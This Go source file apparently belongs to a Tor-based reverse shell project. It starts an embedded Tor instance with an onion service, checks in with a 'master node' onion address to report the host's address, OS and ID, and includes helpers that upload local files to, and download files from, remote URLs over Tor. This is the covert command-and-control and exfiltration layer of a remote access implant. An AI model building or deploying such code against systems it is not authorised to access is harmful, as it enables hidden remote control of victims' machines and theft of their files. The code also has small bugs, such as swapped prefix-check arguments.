package tor

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/cretz/bine/tor"
	"github.com/google/uuid"
	"github.com/humbertovnavarro/tor-reverse-shell/pkg/os_helpers"
	"github.com/ipsn/go-libtor"
	"github.com/joho/godotenv"
)

var userDirName string

var masterNode string

var nodeUUID string

// Setup an ephemeral onion service
var torListenConf = &tor.ListenConf{
	RemotePorts: []int{80},
	Version3:    true,
	Detach:      false,
}

var torStartConf = &tor.StartConf{
	ProcessCreator: libtor.Creator,
	DebugWriter:    os.Stdout,
	DataDir:        getTorDataDir(),
}
var Tor *TorContext
var HttpClient *http.Client
var TorClient *tor.Tor
var Onion *tor.OnionService

type TorContext struct {
	HttpClient *http.Client
	Tor        *tor.Tor
	Onion      *tor.OnionService
	Master     string
}

func NodeUUID() string {
	if nodeUUID != "" {
		return nodeUUID
	}
	uuidFilePath := fmt.Sprintf("%s/%s", userDirName, "uuid")
	exists, err := os_helpers.FileExists(uuidFilePath)
	if err != nil {
		panic(err)
	}
	if exists {
		fileData, err := ioutil.ReadFile(uuidFilePath)
		if err != nil {
			panic(err)
		}
		nodeUUID = string(fileData)
		return string(fileData)
	}
	f, err := os.Create(uuidFilePath)
	if err != nil {
		panic(err)
	}
	_nodeUUID := uuid.NewString()
	nodeUUID = _nodeUUID
	f.WriteString(uuid.NewString())
	return _nodeUUID
}

func init() {
	godotenv.Load()
	if userDirName == "" {
		userDirName = os.Getenv("USER_DATA_DIR")
	}
	if masterNode == "" {
		masterNode = os.Getenv("MASTER_NODE")
	}
	if userDirName == "" {
		panic("tor: cannot resolve user dir")
	}
	// Skip master check in debug mode
	if os.Getenv("DEBUG") != "" {
		return
	}
	if !strings.HasPrefix(".onion", masterNode) {
		log.Fatalf("tor: invalid onion address: %s", masterNode)
	}
	if masterNode == "" {
		panic("tor: could not resolve master node")
	}
}

func New() (*TorContext, error) {
	t, err := tor.Start(context.Background(), torStartConf)
	if err != nil {
		return nil, err
	}
	Tor = &TorContext{
		Tor:    t,
		Master: masterNode,
	}
	err = Tor.newOnionService()
	if err != nil {
		return nil, err
	}
	err = Tor.newHttpClient()
	if err != nil {
		return nil, err
	}
	// Don't initiate handshake in debug mode
	if os.Getenv("DEBUG") == "" {
		for {
			err = Tor.initiateHandshake()
			if err == nil {
				break
			}
			fmt.Printf("could not initiate handshake with %s, trying again", masterNode)
			time.Sleep(time.Second)
		}
	}
	return Tor, nil
}

func (c *TorContext) newOnionService() error {
	if c.Tor == nil {
		return errors.New("tor: the tor service is nil")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	onion, err := c.Tor.Listen(ctx, torListenConf)
	if err != nil {
		return err
	}
	c.Onion = onion
	return nil
}

func (c *TorContext) newHttpClient() error {
	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
	defer dialCancel()
	dialer, err := c.Tor.Dialer(dialCtx, nil)
	if err != nil {
		return err
	}
	c.HttpClient = &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
	return nil
}

type Handshake struct {
	Address string `json:"address"`
	Os      string `json:"os"`
	UUID    string `json:"id"`
}

// Let the master node know we exist
func (c *TorContext) initiateHandshake() error {
	address := c.Onion.Addr().String()
	b, err := json.Marshal(&Handshake{
		Address: address,
		Os:      runtime.GOOS,
		UUID:    nodeUUID,
	})
	if err != nil {
		return err
	}
	r := bytes.NewReader(b)
	resp, err := c.HttpClient.Post(masterNode, "application/json", r)
	if err != nil {
		return err
	}
	b, err = ioutil.ReadAll(resp.Body)
	if string(b) != "ok" {
		return errors.New("tor: bad response from master")
	}
	if err != nil {
		return err
	}
	return nil
}

func getTorDataDir() string {
	userDir, err := os.UserCacheDir()
	if err != nil {
		panic(err)
	}
	return fmt.Sprintf("%s/%s/%s", userDir, userDirName, "tor")
}

// Download a file using the tor httpClient
func (c *TorContext) DownloadFile(path string, fromURL string) error {
	resp, err := c.HttpClient.Get(fromURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	out, err := os.Create(path)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

type FileContents struct {
	fname string
	ftype string
	fdata []byte
}

// Upload a system file using the tor httpClient
func (c *TorContext) UploadFile(path string, toURL string) error {
	var (
		buf = new(bytes.Buffer)
		w   = multipart.NewWriter(buf)
	)
	f, err := fileContentsFromPath(path)
	if err != nil {
		return err
	}
	part, err := w.CreateFormFile(f.ftype, filepath.Base(f.fname))
	if err != nil {
		return err
	}
	part.Write(f.fdata)
	w.Close()
	req, err := http.NewRequest("POST", toURL, buf)
	if err != nil {
		return err
	}
	req.Header.Add("Content-Type", w.FormDataContentType())
	res, err := c.HttpClient.Do(req)
	if err != nil {
		return err
	}
	res.Body.Close()
	return nil
}

// Create a file contents, and infer the mime type and name
func fileContentsFromPath(path string) (*FileContents, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	s := strings.Split(path, "/")
	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}
	http.DetectContentType(fileBytes)
	fileName := s[len(s)-1]
	contentType := http.DetectContentType(fileBytes)
	return &FileContents{
		fname: fileName,
		fdata: fileBytes,
		ftype: contentType,
	}, nil
}